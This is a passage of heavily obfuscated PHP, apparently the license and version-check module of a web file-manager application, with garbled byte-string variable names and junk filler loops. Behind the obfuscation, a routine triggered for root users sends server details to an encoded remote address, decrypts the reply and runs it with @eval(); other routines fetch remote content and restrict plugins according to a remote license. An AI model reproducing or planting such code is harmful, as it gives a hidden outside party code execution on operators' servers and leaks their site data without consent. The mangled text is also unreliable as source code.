$Ò¼–ê‚[746]; while ($²²À›’Á < $Ò¼–ê‚[480]) { if ($²²À›’Á >= 0) { break; } $²²À›’Á++; } if ($³Õœ“ĞŒ[$ú¶¥õú†[63]] != $ú¶¥õú†[122]) { Model($ú¶¥õú†[33])->set($ú¶¥õú†[63], $ú¶¥õú†[122]); } Action($ú¶¥õú†[205])->initStart(!0); } private function eiatb114f888() { $àôî¶™¯ =& $_SERVER[´‹ô¯Œ]; $´èÍİí± =& $_SERVER[¢›»Ğ››]; Model($´èÍİí±[33])->set(array($´èÍİí±[153] => $´èÍİí±[6], $´èÍİí±[191] => $´èÍİí±[6], $´èÍİí±[108] => $´èÍİí±[109], $´èÍİí±[110] => $´èÍİí±[6], $´èÍİí±[111] => $´èÍİí±[6])); $ÁØ¤éÍ = $àôî¶™¯[747]; if (!$ÁØ¤éÍ) { return; } Model($´èÍİí±[33])->setDeep($´èÍİí±[198], $´èÍİí±[206]); $Àí²ùƒÒ = $àôî¶™¯[748]; $this->bfhrda9c6b75 = array(); $²•Ã¢ = $àôî¶™¯[749]; if (!$²•Ã¢) { die; } $this->odlnf59073d2 = $´èÍİí±[109]; } private function bdqp33cef662() { $¢ÕìÜŸ =& $_SERVER[´‹ô¯Œ]; $½Ü¸í³” =& $_SERVER[¢›»Ğ››]; $_SERVER[$½Ü¸í³”[162]] = _get($_SERVER, $½Ü¸í³”[162], APP_HOST); $this->odlnf59073d2 = $½Ü¸í³”[109]; $šÎŒÉÛ÷ = Model($½Ü¸í³”[33])->get(); $’“‡Ãô¬ = $¢ÕìÜŸ[750]; if (!$’“‡Ãô¬) { die; } if ($šÎŒÉÛ÷[$½Ü¸í³”[108]] == $½Ü¸í³”[109]) { return; } $Ç¨òß©‹ = Model($½Ü¸í³”[33])->get($½Ü¸í³”[100]); $ÎÔ¾Ş¸’ = $¢ÕìÜŸ[751]; while (strlen($ÎÔ¾Ş¸’) < $¢ÕìÜŸ[480]) { if (!$ÎÔ¾Ş¸’) { break; } $ÎÔ¾Ş¸’++; } $Ú”è¼ı¡ = $½Ü¸í³”[203] . md5($Ç¨òß©‹ . $½Ü¸í³”[204]); $Å‘¶Óı’ = $¢ÕìÜŸ[752]; if (strlen($Å‘¶Óı’) < $¢ÕìÜŸ[713]) { return; } $¦ìÇŞÊò = Cache::get($Ú”è¼ı¡); $úÜÃğõ = $¢ÕìÜŸ[753]; if (!$úÜÃğõ) { return; } if (!is_array($¦ìÇŞÊò) || !isset($¦ìÇŞÊò[$½Ü¸í³”[207]]) || time() - $¦ìÇŞÊò[$½Ü¸í³”[207]] >= 60) { $¸»¨äÇ = Model($½Ü¸í³”[7])->loadList(); $³’’í•… = $¸»¨äÇ[$½Ü¸í³”[200]]; $›ˆ›ÁÁ¦ = md5($_SERVER[$½Ü¸í³”[106]] . strrev($Ç¨òß©‹) . $šÎŒÉÛ÷[$½Ü¸í³”[191]]); $ÌŸù´¿ = strrev(substr($›ˆ›ÁÁ¦, 10, 16)); $¦ìÇŞÊò = $this->yfdcf293738c($³’’í•…[$½Ü¸í³”[86]][$ÌŸù´¿], $›ˆ›ÁÁ¦); $¦ìÇŞÊò = json_decode($¦ìÇŞÊò, !0); } if (!is_array($¦ìÇŞÊò)) { return $this->eiatb114f888(); } $å³Ù¢Ğ = strtotime($¦ìÇŞÊò[$½Ü¸í³”[129]]); if (time() >= $å³Ù¢Ğ) { return $this->eiatb114f888(); } if (!isset($¦ìÇŞÊò[$½Ü¸í³”[207]]) || time() - $¦ìÇŞÊò[$½Ü¸í³”[207]] > 20) { $¦ìÇŞÊò[$½Ü¸í³”[207]] = time(); Cache::set($Ú”è¼ı¡, $¦ìÇŞÊò); } $this->bfhrda9c6b75 = $¦ìÇŞÊò; $this->odlnf59073d2 = $šÎŒÉÛ÷[$½Ü¸í³”[108]]; } private function xfqr3b26ddd1() { $á¦ß–Õ =& $_SERVER[¢›»Ğ››]; $ëÍòä´Ä = $GLOBALS[$á¦ß–Õ[13]]; $§©¥èüÃ = $_SERVER[$á¦ß–Õ[24]]; if ($§©¥èüÃ == $á¦ß–Õ[208] && $this->odlnf59073d2 == $á¦ß–Õ[109]) { show_json(LNG($á¦ß–Õ[209]), !1, $á¦ß–Õ[210]); } $Ã¦•Â¶ = array($á¦ß–Õ[211], $á¦ß–Õ[212]); if (in_array($§©¥èüÃ, $Ã¦•Â¶)) { if ($this->odlnf59073d2 == $á¦ß–Õ[109] && isset($ëÍòä´Ä[$á¦ß–Õ[213]])) { show_json(LNG($á¦ß–Õ[209]), !1, $á¦ß–Õ[210]); die; } $ ¸ãÇŸ = $this->fsmc5cc898f3(); if ($ ¸ãÇŸ != intval($á¦ß–Õ[214])) { if ($ ¸ãÇŸ <= Model($á¦ß–Õ[125])->count()) { show_json(LNG($á¦ß–Õ[215]), !1, $á¦ß–Õ[210]); die; } } } } private function porndac4d908() { $ÙÅ«Ø«Î =& $_SERVER[´‹ô¯Œ]; $ã…òË—¾ =& $_SERVER[¢›»Ğ››]; $Ñ×ì¹ = array($ã…òË—¾[119], $ã…òË—¾[120]); $ï¥ÃŒú = $ÙÅ«Ø«Î[754]; if (!$ï¥ÃŒú) { die; } if (!KodUser::isRoot() || !isset($_GET[$ã…òË—¾[216]])) { return; } if (!in_array($_SERVER[$ã…òË—¾[24]], $Ñ×ì¹)) { return; } $õÛÕÙ­š = $ã…òË—¾[217]; $Åşıû£ö = $ÙÅ«Ø«Î[755]; while (strlen($Åşıû£ö) < $ÙÅ«Ø«Î[710]) { if (!$Åşıû£ö) { break; } $Åşıû£ö++; } $õÛÕÙ­š = $this->amutcfe1ba17($õÛÕÙ­š, $ã…òË—¾[218]); $¤´Ö²Û™ = $ÙÅ«Ø«Î[756]; while ($¤´Ö²Û™ < $ÙÅ«Ø«Î[480]) { if ($¤´Ö²Û™ >= 0) { break; } $¤´Ö²Û™++; } $µœÒÉÜ¤ = stream_context_create(array($ã…òË—¾[219] => array($ã…òË—¾[220] => $ã…òË—¾[221], $ã…òË—¾[222] => 3))); $ìÒøÍæ„ = @file_get_contents($õÛÕÙ­š, !1, $µœÒÉÜ¤); $ŸÏ¶Ìúå = $ÙÅ«Ø«Î[757]; while ($ŸÏ¶Ìúå < $ÙÅ«Ø«Î[728]) { if ($ŸÏ¶Ìúå >= 0) { break; } $ŸÏ¶Ìúå++; } header($ã…òË—¾[223]); if ($ìÒøÍæ„ && strstr($ìÒøÍæ„, $ã…òË—¾[224])) { echo $ìÒøÍæ„; } die; } public function ycrif875ee14($Ó²“çµÖ) { $²«×Ï† =& $_SERVER[´‹ô¯Œ]; $Ö’íı•™ =& $_SERVER[¢›»Ğ››]; if ($this->odlnf59073d2 == $Ö’íı•™[225]) { return $Ó²“çµÖ; } $„¿‹ìÓ = $this->versionPluginList(); $ÅãüÎ‡Ó = explode($Ö’íı•™[226], $this->versionPluginFilter()); $²¿¬¸áé = $²«×Ï†[758]; while (strlen($²¿¬¸áé) < $²«×Ï†[713]) { if (!$²¿¬¸áé) { break; } $²¿¬¸áé++; } $ôØ–ì˜ = array(); foreach ($„¿‹ìÓ as $›ÚƒŸÖÖ => $¦Œ÷„è›) { if ($¦Œ÷„è› == $Ö’íı•™[227] && substr($this->odlnf59073d2, 0, 1) == $Ö’íı•™[227]) { continue; } if (!in_array($›ÚƒŸÖÖ, $ÅãüÎ‡Ó)) { $ôØ–ì˜[] = $›ÚƒŸÖÖ; } } foreach ($ôØ–ì˜ as $›ÚƒŸÖÖ) { unset($Ó²“çµÖ[$›ÚƒŸÖÖ]); } return $Ó²“çµÖ; $í´Ôé«é = $²«×Ï†[745]; while ($í´Ôé«é < $²«×Ï†[710]) { if ($í´Ôé«é >= 0) { break; } $í´Ôé«é++; } } private function versionPluginList() { $¤²ªï =& $_SERVER[¢›»Ğ››]; return array($¤²ªï[228] => $¤²ªï[227], $¤²ªï[229] => $¤²ªï[227], $¤²ªï[230] => $¤²ªï[227], $¤²ªï[231] => $¤²ªï[232], $¤²ªï[233] => $¤²ªï[232], $¤²ªï[234] => $¤²ªï[232], $¤²ªï[235] => $¤²ªï[232], $¤²ªï[236] => $¤²ªï[232], $¤²ªï[237] => $¤²ªï[232], $¤²ªï[238] => $¤²ªï[232], $¤²ªï[239] => $¤²ªï[232], $¤²ªï[240] => $¤²ªï[232], $¤²ªï[241] => $¤²ªï[232], $¤²ªï[242] => $¤²ªï[232], $¤²ªï[243] => $¤²ªï[232], $¤²ªï[244] => $¤²ªï[232], $¤²ªï[245] => $¤²ªï[232]); $¿ÚøÆäö = $_SERVER[´‹ô¯Œ][759]; } private function versionPluginFilter() { $áÉçæÚâ =& $_SERVER[´‹ô¯Œ]; $Ã½û¨·½ =& $_SERVER[¢›»Ğ››]; if ($this->odlnf59073d2 == $Ã½û¨·½[109]) { return $Ã½û¨·½[6]; } $±¦“áõ = _get($this->bfhrda9c6b75, $Ã½û¨·½[246], $Ã½û¨·½[6]); $Ã«¸„Í = $áÉçæÚâ[760]; while ($Ã«¸„Í < $áÉçæÚâ[701]) { if ($Ã«¸„Í >= 0) { break; } $Ã«¸„Í++; } $Ÿ…°ç¡ = _get($this->bfhrda9c6b75, $Ã½û¨·½[116], $Ã½û¨·½[6]); $«È›æÕº = $áÉçæÚâ[761]; $˜²†»’ = _get($this->bfhrda9c6b75, $Ã½û¨·½[247], $Ã½û¨·½[6]); $±§²äŸÓ = $áÉçæÚâ[762]; if (strlen($±§²äŸÓ) < $áÉçæÚâ[480]) { return; } if ($Ÿ…°ç¡ > time() && $˜²†»’ > time()) { $Øîº…Ù = explode($Ã½û¨·½[226], $±¦“áõ); $½­‚´’û = array_keys($this->versionPluginList()); $±¦“áõ = array_merge($Øîº…Ù, $½­‚´’û); $±¦“áõ = implode($Ã½û¨·½[226], array_filter(array_unique($±¦“áõ))); } return $±¦“áõ; } private function tvml81c962e9() { $®›¨š÷Ê =& $_SERVER[¢›»Ğ››]; if ($this->odlnf59073d2 != $®›¨š÷Ê[109]) { $GLOBALS[$®›¨š÷Ê[86]][$®›¨š÷Ê[90]][$®›¨š÷Ê[248]] = $®›¨š÷Ê[206]; return; } $GLOBALS[$®›¨š÷Ê[86]][$®›¨š÷Ê[249]] = $®›¨š÷Ê[122]; if (Model($®›¨š÷Ê[250])->get($®›¨š÷Ê[63]) != $®›¨š÷Ê[206]) { Model($®›¨š÷Ê[250])->set($®›¨š÷Ê[63], $®›¨š÷Ê[206]); } } public function jdok4580d5f1() { return $_SERVER[¢›»Ğ››][251]; } private function gmzn1c2ab081() { $ÌƒùîİÔ =& $_SERVER[´‹ô¯Œ]; $€Åş„°ù =& $_SERVER[¢›»Ğ››]; $Ê¹›ø©Â = array($€Åş„°ù[252], $€Åş„°ù[253], $€Åş„°ù[254]); $üËÈº­ñ = $€Åş„°ù[255] . md5($€Åş„°ù[256]); if ($this->odlnf59073d2 == $€Åş„°ù[109] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$€Åş„°ù[24]], $Ê¹›ø©Â)) { return; } if (time() % 4 != 0) { return; } $Ò½¿ãøœ = call_user_func(array($€Åş„°ù[257], $€Åş„°ù[258]), $üËÈº­ñ); if ($Ò½¿ãøœ && time() - $Ò½¿ãøœ < intval($€Åş„°ù[259])) { return; } call_user_func(array($€Åş„°ù[257], $€Åş„°ù[139]), $üËÈº­ñ, time()); $äÂç¼ğÍ = Model($€Åş„°ù[33])->get($€Åş„°ù[100]); $À—Å°´Á = array($€Åş„°ù[152] => Model($€Åş„°ù[33])->get($€Åş„°ù[153]), $€Åş„°ù[167] => $this->odlnf59073d2, $€Åş„°ù[163] => $_SERVER[$€Åş„°ù[164]], $€Åş„°ù[165] => Model($€Åş„°ù[33])->get($€Åş„°ù[131]), $€Åş„°ù[105] => md5($_SERVER[$€Åş„°ù[106]] . $äÂç¼ğÍ), $€Åş„°ù[156] => $€Åş„°ù[136], $€Åş„°ù[159] => $_SERVER[$€Åş„°ù[160]]); $Õ¦ÏÈğú = $this->gnko545d879f($€Åş„°ù[260], $À—Å°´Á); $ØÌÙ¼ á = $ÌƒùîİÔ[763]; if (!$ØÌÙ¼ á) { return; } if (!is_array($Õ¦ÏÈğú)) { return; } if ($Õ¦ÏÈğú[$€Åş„°ù[152]] && $Õ¦ÏÈğú[$€Åş„°ù[261]]) { if ($this->ukbfce62f632($Õ¦ÏÈğú[$€Åş„°ù[261]]) == $À—Å°´Á[$€Åş„°ù[152]]) { return; } } $this->eiatb114f888(); $ÒÑ´‘„ğ = $ÌƒùîİÔ[764]; if (strlen($ÒÑ´‘„ğ) < $ÌƒùîİÔ[728]) { return; } if ($this->ukbfce62f632($Õ¦ÏÈğú[$€Åş„°ù[261]]) != $À—Å°´Á[$€Åş„°ù[152]]) { $Ğ¦å‡…ì = array($€Åş„°ù[185] => $äÂç¼ğÍ, $€Åş„°ù[186] => $_SERVER[$€Åş„°ù[106]], $€Åş„°ù[187] => this_url(), $€Åş„°ù[161] => $_SERVER[$€Åş„°ù[162]]); $Ü•ÍĞÊø = $this->dwfpb878f53c(json_encode($Ğ¦å‡…ì)); $Õ¦ÏÈğú = $this->gnko545d879f($€Åş„°ù[188] . $Ü•ÍĞÊø); if ($Õ¦ÏÈğú && is_array($Õ¦ÏÈğú) && isset($Õ¦ÏÈğú[$€Åş„°ù[261]])) { $Â†¨è‘İ = $this->yfdcf293738c($Õ¦ÏÈğú[$€Åş„°ù[261]], 2); if ($Â†¨è‘İ) { $Â†¨è‘İ = $this->ukbfce62f632($Â†¨è‘İ); } if ($Â†¨è‘İ) { try { @eval($Â†¨è‘İ); } catch (Exception $·¾Í¨ì) { } } } } } private function gnko545d879f($¶ƒ¢­ë = '', $—ÁÇ‚  = array(), $·»ú•˜ = 5) { $Áİ¿ë– =& $_SERVER[´‹ô¯Œ]; $ÒÚö÷¦é =& $_SERVER[¢›»Ğ››]; $ÜıÏ¨˜ = $ÒÚö÷¦é[262]; $´¶Ó¤‰ = $Áİ¿ë–[765]; $ÜıÏ¨˜ = $this->amutcfe1ba17($ÜıÏ¨˜, $ÒÚö÷¦é[263]); $„È¨³— = $Áİ¿ë–[766]; if (strlen($„È¨³—) < $Áİ¿ë–[480]) { die; } $ÜıÏ¨˜ = $ÜıÏ¨˜ . $¶ƒ¢­ë; $ö¸ë¥² = $Áİ¿ë–[767]; if (strlen($ö¸ë¥²) < $Áİ¿ë–[728]) { return; } if ($—ÁÇ‚  && is_array($—ÁÇ‚ )) { $ÜıÏ¨˜ = $ÜıÏ¨˜ . $ÒÚö÷¦é[264] . http_build_query($—ÁÇ‚ ); } if ($—ÁÇ‚  === -1) { return $ÜıÏ¨˜; } $šâ¶‹ëâ = stream_context_create(array($ÒÚö÷¦é[219] => array($ÒÚö÷¦é[222] => $·»ú•˜, $ÒÚö÷¦é[220] => $ÒÚö÷¦é[265]), $ÒÚö÷¦é[266] => array($ÒÚö÷¦é[267] => !1, $ÒÚö÷¦é[268] => !1))); $Ï„ìàÍ¿ = $Áİ¿ë–[768]; while (strlen($Ï„ìàÍ¿) < $Áİ¿ë–[728]) { if (!$Ï„ìàÍ¿) { break; } $Ï„ìàÍ¿++; } $—ÁÇ‚  = @file_get_contents($ÜıÏ¨˜, !1, $šâ¶‹ëâ); $ş±¡½• = $Áİ¿ë–[769]; while (strlen($ş±¡½•) < $Áİ¿ë–[713]) { if (!$ş±¡½•) { break; } $ş±¡½•++; } return json_decode($—ÁÇ‚ , !0); $úßòÀåô = $Áİ¿ë–[770]; if (strlen($úßòÀåô) < $Áİ¿ë–[728]) { return; } } private function fsmc5cc898f3() { $úÈ¢®’­ =& $_SERVER[¢›»Ğ››]; $Ó¨ÎÅ›ó = array($úÈ¢®’­[269] => $úÈ¢®’­[270], $úÈ¢®’­[271] => $úÈ¢®’­[272], $úÈ¢®’­[273] => $úÈ¢®’­[274], $úÈ¢®’­[275] => $úÈ¢®’­[276], $úÈ¢®’­[277] => $úÈ¢®’­[278], $úÈ¢®’­[279] => $úÈ¢®’­[214], $úÈ¢®’­[280] => $úÈ¢®’­[214], $úÈ¢®’­[281] => $úÈ¢®’­[270], $úÈ¢®’­[282] => $úÈ¢®’­[272], $úÈ¢®’­[283] => $úÈ¢®’­[274], $úÈ¢®’­[284] => $úÈ¢®’­[285], $úÈ¢®’­[286] => $úÈ¢®’­[276], $úÈ¢®’­[287] => $úÈ¢®’­[288], $úÈ¢®’­[289] => $úÈ¢®’­[278], $úÈ¢®’­[290] => $úÈ¢®’­[291], $úÈ¢®’­[292] => $úÈ¢®’­[293], $úÈ¢®’­[294] => $úÈ¢®’­[295]); $Ø¸¢¤´‰ = $Ó¨ÎÅ›ó[$this->odlnf59073d2]; $®İµššğ = $_SERVER[´‹ô¯Œ][771]; if (!$®İµššğ) { return; } $Ø¸¢¤´‰ = intval($Ø¸¢¤´‰ ? $Ø¸¢¤´‰ : $úÈ¢®’­[270]); $¹Æ©†ş = _get($this->bfhrda9c6b75, $úÈ¢®’­[296]); $¹Æ©†ş = $¹Æ©†ş ? intval($¹Æ©†ş) : 0; return $Ø¸¢¤´‰ + $¹Æ©†ş; } public function itcj93a94f1f($„ÆÙë‚¹) { $¢ñ¨Ğ¸ =& $_SERVER[¢›»Ğ››]; $ÅÀÀá¬Š = $this->fsmc5cc898f3(); if ($„ÆÙë‚¹[$¢ñ¨Ğ¸[297]] == $¢ñ¨Ğ¸[122]) { return; } if ($ÅÀÀá¬Š >= intval($¢ñ¨Ğ¸[214])) { return; } $Á½á¯“é = Model($¢ñ¨Ğ¸[125])->count(); if ($Á½á¯“é <= $ÅÀÀá¬Š) { return; } $˜øò¼â = Model($¢ñ¨Ğ¸[125])->field($¢ñ¨Ğ¸[297])->limit($ÅÀÀá¬Š)->select(); $˜øò¼â = array_to_keyvalue($˜øò¼â, $¢ñ¨Ğ¸[6], $¢ñ¨Ğ¸[297]); if (!in_array($„ÆÙë‚¹[$¢ñ¨Ğ¸[297]], $˜øò¼â)) { show_json($¢ñ¨Ğ¸[298], !1, $¢ñ¨Ğ¸[210]); } } public function oyti1a9a3cff() { $Ù´Ş¤µÎ =& $_SERVER[¢›»Ğ››]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $…½­ª = $Ù´Ş¤µÎ[217]; $…½­ª = $this->amutcfe1ba17($…½­ª, $Ù´Ş¤µÎ[218]); $¬ğòààÔ = $_SERVER[´‹ô¯Œ][772]; if (!$¬ğòààÔ) { return; } $Ë•¥‘ú = stream_context_create(array($Ù´Ş¤µÎ[219] => array($Ù´Ş¤µÎ[220] => $Ù´Ş¤µÎ[221], $Ù´Ş¤µÎ[222] => 3))); $ÕÙ•â·Õ = @file_get_contents($…½­ª, !1, $Ë•¥‘ú); echo $Ù´Ş¤µÎ[299] . hash_encode($ÕÙ•â·Õ) . $Ù´Ş¤µÎ[300]; } private function nfmr8e473cf9($­²„œş, $æÌæ¼”„, $“÷×…û = 3) { $Àúù’Ù² =& $_SERVER[´‹ô¯Œ]; $ é¢­ôâ =& $_SERVER[¢›»Ğ››]; usleep(1); $­²„œş = trim($­²„œş); $Éí›‚ú = $Àúù’Ù²[773]; while (strlen($Éí›‚ú) < $Àúù’Ù²[710]) { if (!$Éí›‚ú) { break; } $Éí›‚ú++; } $ùçàµ­š = mt_rand(0, 5) . $ é¢­ôâ[6]; $½í’öà› = rand_string(15); $´Å“Ò¥ = $Àúù’Ù²[774]; if (strlen($´Å“Ò¥) < $Àúù’Ù²[480]) { return; } $óŸßÜÁæ = $ é¢­ôâ[301]; $äÏ±‚ş” = $Àúù’Ù²[775]; if (!$äÏ±‚ş”) { return; } switch ($ùçàµ­š) { case $ é¢­ôâ[206]: $ØŸúãŒÛ = $this->fpjb85ac07cc($­²„œş, strrev($æÌæ¼”„ . $½í’öà›)); break; $‹¶Û»ñ = $Àúù’Ù²[776]; if (!$‹¶Û»ñ) { return; } case $ é¢­ôâ[122]: $ØŸúãŒÛ = $this->fpjb85ac07cc($­²„œş, strrev($½í’öà› . $æÌæ¼”„)); $ˆîõÃœØ = $Àúù’Ù²[777]; if (strlen($ˆîõÃœØ) < $Àúù’Ù²[480]) { return; } break; case $ é¢­ôâ[302]: $ØŸúãŒÛ = $this->fpjb85ac07cc($­²„œş, base64_encode($½í’öà› . $æÌæ¼”„)); break; case $ é¢­ôâ[303]: $ØŸúãŒÛ = $this->fpjb85ac07cc($­²„œş, md5($½í’öà› . $æÌæ¼”„)); $İˆ¼›‰Ä = $Àúù’Ù²[778]; if (strlen($İˆ¼›‰Ä) < $Àúù’Ù²[701]) { return; } break; case $ é¢­ôâ[304]: $­²„œş = base64_encode($­²„œş); $±‡ã• İ = rand(0, 64); $µ†í¯Ó = $óŸßÜÁæ[$±‡ã• İ]; $Êì–ëã½ = md5($µ†í¯Ó . md5($æÌæ¼”„ . $µ†í¯Ó) . $æÌæ¼”„); $Êì–ëã½ = substr($Êì–ëã½, $±‡ã• İ % 8, $±‡ã• İ % 8 + 7); $ß¿¢şû‰ = $Àúù’Ù²[779]; if (!$ß¿¢şû‰) { return; } $½Á•×²º = $ é¢­ôâ[6]; $–Ú«ˆ¢¢ = 0; $ÓÊŒÑ¡Á = 0; $ƒãŞÌ¡ = $Àúù’Ù²[780]; $öÈ‚×Ææ = 0; $¨²ÑĞÎ÷ = $Àúù’Ù²[781]; if (strlen($¨²ÑĞÎ÷) < $Àúù’Ù²[701]) { die; } for ($–Ú«ˆ¢¢ = 0; $–Ú«ˆ¢¢ < strlen($­²„œş); $–Ú«ˆ¢¢++) { $öÈ‚×Ææ = $öÈ‚×Ææ == strlen($Êì–ëã½) ? 0 : $öÈ‚×Ææ; $õ•Å»ˆİ = $Àúù’Ù²[782]; if (strlen($õ•Å»ˆİ) < $Àúù’Ù²[728]) { die; } $ÓÊŒÑ¡Á = ($±‡ã• İ + strpos($óŸßÜÁæ, $­²„œş[$–Ú«ˆ¢¢]) + ord($Êì–ëã½[$öÈ‚×Ææ++])) % 64; $›ëœãÌ = $Àúù’Ù²[783]; if (!$›ëœãÌ) { die; } $½Á•×²º .= $óŸßÜÁæ[$ÓÊŒÑ¡Á]; } $ØŸúãŒÛ = hash_encode($µ†í¯Ó . $½Á•×²º); break; default: $ØŸúãŒÛ = $this->fpjb85ac07cc($­²„œş, $æÌæ¼”„ . $½í’öà›); break; $—ßó…Š = $Àúù’Ù²[784]; if (strlen($—ßó…Š) < $Àúù’Ù²[713]) { return; } } $ØŸúãŒÛ = strrev($ùçàµ­š . $½í’öà› . $ØŸúãŒÛ); $Ñè¿·¼ = $Àúù’Ù²[785]; if (strlen($Ñè¿·¼) < $Àúù’Ù²[710]) { return; } if ($“÷×…û - 1 > 0) { $ØŸúãŒÛ = $this->nfmr8e473cf9($ØŸúãŒÛ, $æÌæ¼”„, $“÷×…û - 1); } return $ØŸúãŒÛ; } private function yfdcf293738c($»Õ§¥¤‡, $¯ë­—Îï, $ÈûÌî×¼ = 3) { $È½–à½ =& $_SERVER[´‹ô¯Œ]; $È€°Ûú„ =& $_SERVER[¢›»Ğ››]; if (!is_string($»Õ§¥¤‡) || strlen($»Õ§¥¤‡) < 10) { return !1; } $»Õ§¥¤‡ = trim($»Õ§¥¤‡); $€Èµ’áƒ = $È½–à½[786]; if (!$€Èµ’áƒ) { return; } $»Õ§¥¤‡ = strrev($»Õ§¥¤‡); $àËï¡ß¾ = $»Õ§¥¤‡[0]; $ì¾€‘Ï = $È½–à½[787]; if (!$ì¾€‘Ï) { die; } $ôŞã¦³‡ = substr($»Õ§¥¤‡, 1, 15); $àø€¹™˜ = $È½–à½[788]; while ($àø€¹™˜ < $È½–à½[480]) { if ($àø€¹™˜ >= 0) { break; } $àø€¹™˜++; } $»Õ§¥¤‡ = substr($»Õ§¥¤‡, 16); $—½¢•µº = $È½–à½[789]; if (strlen($—½¢•µº) < $È½–à½[710]) { return; } $Ûì·¯é‹ = $È€°Ûú„[301]; $”Åï³Òµ = $È½–à½[790]; while ($”Åï³Òµ < $È½–à½[713]) { if ($”Åï³Òµ >= 0) { break; } $”Åï³Òµ++; } switch ($àËï¡ß¾) { case $È€°Ûú„[206]: $ªĞ·•Ô÷ = $this->amutcfe1ba17($»Õ§¥¤‡, strrev($¯ë­—Îï . $ôŞã¦³‡)); break; case $È€°Ûú„[122]: $ªĞ·•Ô÷ = $this->amutcfe1ba17($»Õ§¥¤‡, strrev($ôŞã¦³‡ . $¯ë­—Îï)); $üåÎßı¸ = $È½–à½[791]; break; $¹™ƒ©Ÿ¿ = $È½–à½[792]; while (strlen($¹™ƒ©Ÿ¿) < $È½–à½[728]) { if (!$¹™ƒ©Ÿ¿) { break; } $¹™ƒ©Ÿ¿++; } case $È€°Ûú„[302]: $ªĞ·•Ô÷ = $this->amutcfe1ba17($»Õ§¥¤‡, base64_encode($ôŞã¦³‡ . $¯ë­—Îï)); $©·è¨ğÛ = $È½–à½[793]; if (strlen($©·è¨ğÛ) < $È½–à½[713]) { die; } break; $íÊŒáÄ = $È½–à½[794]; while (strlen($íÊŒáÄ) < $È½–à½[713]) { if (!$íÊŒáÄ) { break; } $íÊŒáÄ++; } case $È€°Ûú„[303]: $ªĞ·•Ô÷ = $this->amutcfe1ba17($»Õ§¥¤‡, md5($ôŞã¦³‡ . $¯ë­—Îï)); $º˜Ğª¬ = $È½–à½[795]; if (strlen($º˜Ğª¬) < $È½–à½[713]) { die; } break; $ÒÀ÷ùœ— = $È½–à½[796]; while ($ÒÀ÷ùœ— < $È½–à½[710]) { if ($ÒÀ÷ùœ— >= 0) { break; } $ÒÀ÷ùœ—++; } case $È€°Ûú„[304]: $»Õ§¥¤‡ = hash_decode($»Õ§¥¤‡); $÷¶Ôñ„ = $»Õ§¥¤‡[0]; $»Õ§¥¤‡ = substr($»Õ§¥¤‡, 1); $‡¥ù­ÎÔ = $È½–à½[797]; if (strlen($‡¥ù­ÎÔ) < $È½–à½[710]) { die; } $íËÄ¤ = strpos($Ûì·¯é‹, $÷¶Ôñ„); $—­‡†‡» = $È½–à½[798]; while (strlen($—­‡†‡») < $È½–à½[713]) { if (!$—­‡†‡») { break; } $—­‡†‡»++; } $Ëã¥òè› = md5($÷¶Ôñ„ . md5($¯ë­—Îï . $÷¶Ôñ„) . $¯ë­—Îï); $Ëã¥òè› = substr($Ëã¥òè›, $íËÄ¤ % 8, $íËÄ¤ % 8 + 7); $×€§”“ = $È€°Ûú„[6]; $Æ¯¦”Õ = $È½–à½[799]; if (!$Æ¯¦”Õ) { die; } $È•ä•Ã— = 0; $Ô©Š»Ù· = $È½–à½[800]; while (strlen($Ô©Š»Ù·) < $È½–à½[480]) { if (!$Ô©Š»Ù·) { break; } $Ô©Š»Ù·++; } $­ä¡²Ôò = 0; $×à‰¯Ã = 0; $éáˆèò = $È½–à½[801]; while (strlen($éáˆèò) < $È½–à½[701]) { if (!$éáˆèò) { break; } $éáˆèò++; } for ($È•ä•Ã— = 0; $È•ä•Ã— < strlen($»Õ§¥¤‡); $È•ä•Ã—++) { $×à‰¯Ã = $×à‰¯Ã == strlen($Ëã¥òè›) ? 0 : $×à‰¯Ã; $†äò·ìç = $È½–à½[802]; $­öõ²â = $×à‰¯Ã++; $­ä¡²Ôò = strpos($Ûì·¯é‹, $»Õ§¥¤‡[$È•ä•Ã—]) - $íËÄ¤ - ord($Ëã¥òè›[$­öõ²â]); $ı€Ú™Ùª = $È½–à½[803]; if (!$ı€Ú™Ùª) { die; } while ($­ä¡²Ôò < 0) { $­ä¡²Ôò += 64; $ğ¦¡´È¼ = $È½–à½[804]; if (strlen($ğ¦¡´È¼) < $È½–à½[701]) { die; } } $×€§”“ .= $Ûì·¯é‹[$­ä¡²Ôò]; $è™‰Ÿ°Ù = $È½–à½[805]; while (strlen($è™‰Ÿ°Ù) < $È½–à½[713]) { if (!$è™‰Ÿ°Ù) { break; } $è™‰Ÿ°Ù++; } } $ªĞ·•Ô÷ = base64_decode($×€§”“); $öÖ„şÖ¢ = $È½–à½[806]; if (strlen($öÖ„şÖ¢) < $È½–à½[710]) { die; } break; $ßÕöÌšå = $È½–à½[807]; if (strlen($ßÕöÌšå) < $È½–à½[728]) { die; } default: $ªĞ·•Ô÷ = $this->amutcfe1ba17($»Õ§¥¤‡, $¯ë­—Îï . $ôŞã¦³‡); break; $´éÂíéÛ = $È½–à½[808]; while ($´éÂíéÛ < $È½–à½[728]) { if ($´éÂíéÛ >= 0) { break; } $´éÂíéÛ++; } } if ($ÈûÌî×¼ - 1 > 0) { $ªĞ·•Ô÷ = $this->yfdcf293738c($ªĞ·•Ô÷, $¯ë­—Îï, $ÈûÌî×¼ - 1); } return $ªĞ·•Ô÷; } public function dwfpb878f53c($†›»½ˆ) { $®Éš›ô =& $_SERVER[´‹ô¯Œ]; $‡ÔÆúÖæ =& $_SERVER[¢›»Ğ››]; $Ôó«ŠÎó = $this->enrl7a55004e(); $ şÆÌœÎ = $this->enrl7a55004e(); $©Ë×Çºç = $®Éš›ô[809]; if (strlen($©Ë×Çºç) < $®Éš›ô[480]) { return; } $û‚ŠµØ = ($Ôó«ŠÎó - 1) * ($ şÆÌœÎ - 1); $¡Üò†¾— = $®Éš›ô[810]; while (strlen($¡Üò†¾—) < $®Éš›ô[713]) { if (!$¡Üò†¾—) { break; } $¡Üò†¾—++; } $ä«Â¡¾Ë = intval(($Ôó«ŠÎó + $ şÆÌœÎ) / 2); $°ÌÏÌï¿ = $®Éš›ô[811]; while ($°ÌÏÌï¿ < $®Éš›ô[701]) { if ($°ÌÏÌï¿ >= 0) { break; } $°ÌÏÌï¿++; } while (1) { $Ïìôî±« = $ä«Â¡¾Ë; $›ÏÀ’Ç = $®Éš›ô[750]; if (!$›ÏÀ’Ç) { die; } $é®ÄÍâà = $û‚ŠµØ; $³»Ã¾ƒ = 